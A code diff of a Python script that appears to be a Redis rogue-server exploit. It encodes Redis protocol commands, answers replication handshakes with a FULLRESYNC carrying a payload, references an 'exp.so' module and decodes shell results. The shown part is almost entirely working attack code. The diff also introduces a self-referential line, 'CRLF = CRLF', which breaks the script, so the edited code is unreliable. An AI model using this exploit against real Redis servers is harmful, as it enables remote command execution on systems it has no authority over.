@@ -4,7 +4,7 @@ import sys
 from time import sleep
 from optparse import OptionParser
 
-CLRF = "\r\n"
+CRLF = CRLF
 SERVER_EXP_MOD_FILE = "exp.so"
 
 BANNER = """______         _ _      ______                         _____                          
@@ -22,9 +22,9 @@ def encode_cmd_arr(arr):
     cmd = ""
     cmd += "*" + str(len(arr))
     for arg in arr:
-        cmd += CLRF + "$" + str(len(arg))
-        cmd += CLRF + arg
-    cmd += "\r\n"
+        cmd += CRLF + "$" + str(len(arg))
+        cmd += CRLF + arg
+    cmd += CRLF
     return cmd
 
 def encode_cmd(raw_cmd):
@@ -32,10 +32,10 @@ def encode_cmd(raw_cmd):
 
 def decode_cmd(cmd):
     if cmd.startswith("*"):
-        raw_arr = cmd.strip().split("\r\n")
+        raw_arr = cmd.strip().split(CRLF)
         return raw_arr[2::2]
     if cmd.startswith("$"):
-        return cmd.split("\r\n", 2)[1]
+        return cmd.split(CRLF, 2)[1]
     return cmd.strip().split(" ")
 
 def info(msg):
@@ -66,7 +66,7 @@ def dout(sock, msg):
             print(f"\033[1;33;40m[<-]\033[0m {msg[:80]}......{msg[-80:]}")
 
 def decode_shell_result(s):
-    return "\n".join(s.split("\r\n")[1:-1])
+    return "\n".join(s.split(CRLF)[1:-1])
 
 class Remote:
     def __init__(self, rhost, rport):
@@ -107,16 +107,16 @@ class RogueServer:
         resp = ""
         phase = 0
         if cmd_arr[0].startswith("PING"):
-            resp = "+PONG" + CLRF
+            resp = "+PONG" + CRLF
             phase = 1
         elif cmd_arr[0].startswith("REPLCONF"):
-            resp = "+OK" + CLRF
+            resp = "+OK" + CRLF
             phase = 2
         elif cmd_arr[0].startswith("PSYNC") or cmd_arr[0].startswith("SYNC"):
-            resp = "+FULLRESYNC " + "Z"*40 + " 1" + CLRF
-            resp += "$" + str(len(payload)) + CLRF
+            resp = "+FULLRESYNC " + "Z"*40 + " 1" + CRLF
+            resp += "$" + str(len(payload)) + CRLF
             resp = resp.encode()
-            resp += payload + CLRF.encode()
+            resp += payload + CRLF.encode()
             phase = 3
         return resp, phase
 
